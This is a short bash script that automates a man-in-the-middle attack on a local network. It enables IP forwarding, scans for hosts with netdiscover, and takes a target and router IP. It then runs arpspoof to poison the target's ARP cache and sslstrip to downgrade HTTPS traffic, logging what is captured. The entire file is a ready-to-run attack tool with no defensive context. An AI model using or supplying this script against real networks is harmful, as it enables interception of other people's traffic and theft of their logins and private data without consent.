#!/bin/bash

clear

if [ $EUID -ne 0 ]; then
    sudo  "$0" "$@"
    exit $1
fi

Interfaces=`ip link | awk -F: '$0 !~ "lo|vir|^[^0-9]"{print $2a;getline}'`

echo "Choose an interface"
select interface in $Interfaces; do
echo "$interface selected"
break
done

sudo sysctl -w net.ipv4.ip_forward=1

echo "This script is for arp spoofing and ssl striping"

read -p "Timeout in secs: " timeout

echo "scanning..."

sleep 1

nohup xterm -e termdown $timeout > /dev/null 2>&1 &
nohup timeout $timeout xterm -hold -e sudo netdiscover > /dev/null 2>&1 &

read -p "Target device ip: " device
read -p "Router ip: " router 

nohup xterm -hold -e sudo arpspoof -i $interface -t $device -r $router > /dev/null 2>&1 &

nohup xterm -hold -e sudo sslstrip -l 8080 > /dev/null 2>&1 &
sleep 1
nohup xterm -hold -e tail -f sslstrip.log

